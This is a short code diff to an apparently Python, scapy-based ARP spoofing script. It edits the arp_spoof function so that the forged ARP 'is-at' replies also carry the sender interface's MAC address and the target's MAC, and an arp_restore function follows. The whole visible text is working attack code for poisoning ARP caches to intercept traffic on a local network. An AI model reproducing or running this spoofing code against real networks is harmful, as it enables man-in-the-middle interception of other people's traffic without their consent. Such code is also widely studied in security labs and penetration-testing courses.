@@ -2,7 +2,7 @@ from scapy.all import *
 import sys
 
 def arp_spoof(dest_ip, dest_mac, source_ip):
-    packet = ARP(pdst=dest_ip, psrc=source_ip, op="is-at")
+    packet = ARP(pdst=dest_ip, hwsrc=get_if_hwaddr(conf.iface), hwdst= dest_mac ,  psrc=source_ip, op="is-at")
     send(packet, verbose=False)
 
 def arp_restore(dest_ip, dest_mac, source_ip, source_mac):
